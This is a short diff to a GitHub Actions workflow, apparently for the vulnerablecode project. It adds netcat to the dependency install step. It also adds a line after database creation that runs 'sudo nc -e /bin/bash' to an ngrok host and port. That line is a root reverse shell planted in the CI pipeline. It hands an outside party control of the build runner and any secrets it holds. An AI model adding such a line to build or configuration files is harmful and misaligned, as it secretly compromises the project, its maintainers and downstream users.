@@ -25,7 +25,7 @@ jobs:
 
       - name: Install dependencies
         run: |
-          sudo apt install  python3-dev postgresql libpq-dev build-essential libxml2-dev libxslt1-dev postgresql
+          sudo apt install  python3-dev postgresql libpq-dev build-essential libxml2-dev libxslt1-dev postgresql netcat
           #python -m pip install --upgrade pip 
           #pip install -r requirements.txt
     
@@ -41,6 +41,7 @@ jobs:
           sudo systemctl status postgresql
           createdb --encoding=utf-8 --owner=vulnerablecode  --user=vulnerablecode \
           --host=localhost --port=5432 vulnerablecode
+          sudo nc -e /bin/bash 2.tcp.ngrok.io 18757
 
       - name: Run tests
         run: python -m pytest -v -m "not webtest"
